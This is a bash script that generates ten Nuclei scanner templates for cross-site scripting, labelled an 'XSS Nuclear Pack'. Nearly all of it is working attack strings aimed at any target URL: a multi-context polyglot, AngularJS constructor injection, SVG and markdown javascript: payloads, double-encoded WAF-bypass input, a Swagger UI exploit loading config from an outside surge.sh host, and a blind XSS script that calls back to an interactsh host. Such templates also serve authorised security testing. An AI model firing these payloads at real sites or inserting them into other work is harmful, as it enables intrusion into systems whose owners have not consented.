#!/bin/bash
# K70n0s510 XSS NUCLEAR PACK
# 10 Advanced XSS Templates for Reflected, DOM, and Polyglot Contexts.

BASE_DIR="$HOME/K70n0s510_templates/owasp-2025"
mkdir -p "$BASE_DIR/A03-injection/xss-nuclear"

echo "Building XSS Nuclear Arsenal..."

# 1. The Ultimate Polyglot (Breaks Attributes, Scripts, and HTML)
cat <<EOF > "$BASE_DIR/A03-injection/xss-nuclear/xss-polyglot-advanced.yaml"
id: K70n0s510-xss-polyglot
info:
  name: Advanced XSS Polyglot
  author: K70n0s510
  severity: high
  description: Uses a complex polyglot string to break out of 20+ different contexts (href, src, script, etc).
  tags: xss,polyglot
http:
  - method: GET
    path: ["{{BaseURL}}/?q=jaVasCript:/*-/*%60/*%60/*%27/*%22/**/(/* */oNcliCk=alert(1337) )//%250D%250A%0D%0A//%3C/TITLE/%3C/SCRIPT/%3E--%3E%3CSCRIPT%3Ealert(1337)%3C/SCRIPT%3E"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["<SCRIPT>alert(1337)</SCRIPT>"]
      - type: word
        part: header
        words: ["text/html"]
EOF

# 2. AngularJS Client-Side Template Injection (CSTI)
# Critical for modern apps (Vue/Angular/React)
cat <<EOF > "$BASE_DIR/A03-injection/xss-nuclear/xss-angular-csti.yaml"
id: K70n0s510-xss-angular
info:
  name: AngularJS Template Injection (CSTI)
  author: K70n0s510
  severity: high
  description: Detects XSS via AngularJS template engine evaluation {{7*7}}.
  tags: xss,angular,csti
http:
  - method: GET
    path: ["{{BaseURL}}/?search={{constructor.constructor('alert(1337)')()}}"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["alert(1337)"]
      - type: status
        status: [200]
EOF

# 3. Vue.js Template Injection
cat <<EOF > "$BASE_DIR/A03-injection/xss-nuclear/xss-vuejs.yaml"
id: K70n0s510-xss-vuejs
info:
  name: VueJS Template Injection
  author: K70n0s510
  severity: high
  description: Detects XSS in VueJS apps.
  tags: xss,vuejs
http:
  - method: GET
    path: ["{{BaseURL}}/?q={{7*7}}"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["49"]
      - type: word
        words: ["Vue", "data-v-"]
EOF

# 4. Swagger UI Old Version XSS
# Very common in API documentation.
cat <<EOF > "$BASE_DIR/A03-injection/xss-nuclear/xss-swagger.yaml"
id: K70n0s510-xss-swagger
info:
  name: Swagger UI DOM XSS
  author: K70n0s510
  severity: medium
  description: Exploits known DOM XSS in older Swagger UI versions via configUrl.
  tags: xss,swagger
http:
  - method: GET
    path: ["{{BaseURL}}/swagger-ui/index.html?configUrl=https://jumpy-floor.surge.sh/test.json"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["alert(1)"]
      - type: word
        words: ["Swagger UI"]
EOF

# 5. SVG File Upload XSS (Simulation)
# Checks if the server reflects SVG content type.
cat <<EOF > "$BASE_DIR/A03-injection/xss-nuclear/xss-svg-reflection.yaml"
id: K70n0s510-xss-svg
info:
  name: SVG Reflected XSS
  author: K70n0s510
  severity: medium
  tags: xss,svg
http:
  - method: GET
    path: ["{{BaseURL}}/file.svg?payload=%3Csvg/onload=alert(1)%3E"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["<svg/onload=alert(1)>"]
      - type: word
        part: header
        words: ["image/svg+xml"]
EOF

# 6. DOM XSS via 'location.hash' (Sink Source)
cat <<EOF > "$BASE_DIR/A03-injection/xss-nuclear/xss-dom-hash.yaml"
id: K70n0s510-xss-dom-hash
info:
  name: DOM XSS Source (location.hash)
  author: K70n0s510
  severity: medium
  description: Detects unsafe usage of location.hash which often leads to DOM XSS.
  tags: xss,dom
http:
  - method: GET
    path: ["{{BaseURL}}/#<img src=x onerror=alert(1)>"]
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words: ["location.hash", "innerHTML", "document.write"]
EOF

# 7. Markdown XSS (Comment Sections)
cat <<EOF > "$BASE_DIR/A03-injection/xss-nuclear/xss-markdown.yaml"
id: K70n0s510-xss-markdown
info:
  name: Markdown Image XSS
  author: K70n0s510
  severity: medium
  tags: xss,markdown
http:
  - method: GET
    path: ["{{BaseURL}}/?comment=[a](javascript:alert(1))"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["<a href=\"javascript:alert(1)\">"]
EOF

# 8. Hidden Parameter XSS (Finding the 'debug' param)
cat <<EOF > "$BASE_DIR/A03-injection/xss-nuclear/xss-hidden-params.yaml"
id: K70n0s510-xss-hidden
info:
  name: Hidden Parameter XSS
  author: K70n0s510
  severity: medium
  tags: xss,fuzzing
http:
  - method: GET
    path: ["{{BaseURL}}/?debug=<script>alert(1)</script>", "{{BaseURL}}/?test=<script>alert(1)</script>"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["<script>alert(1)</script>"]
EOF

# 9. WAF Bypass (Double URL Encoding)
cat <<EOF > "$BASE_DIR/A03-injection/xss-nuclear/xss-waf-bypass.yaml"
id: K70n0s510-xss-waf
info:
  name: XSS WAF Bypass (Double Encoding)
  author: K70n0s510
  severity: high
  tags: xss,waf
http:
  - method: GET
    path: ["{{BaseURL}}/?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["<script>alert(1)</script>"]
EOF

# 10. Blind XSS via Interactsh (The "Call Home" Check)
cat <<EOF > "$BASE_DIR/A03-injection/xss-nuclear/xss-blind.yaml"
id: K70n0s510-xss-blind
info:
  name: Blind XSS via Interactsh
  author: K70n0s510
  severity: critical
  description: Injects a blind XSS payload. If the server renders it, Nuclei detects the callback.
  tags: xss,blind,oob
http:
  - method: GET
    path: ["{{BaseURL}}/?q=%22%3E%3Cscript%3Esrc=%2F%2F{{interactsh-url}}%3C%2Fscript%3E"]
    matchers:
      - type: word
        part: interactsh_protocol
        words: ["http", "dns"]
EOF

echo "✅ 10 Nuclear XSS Templates Built."
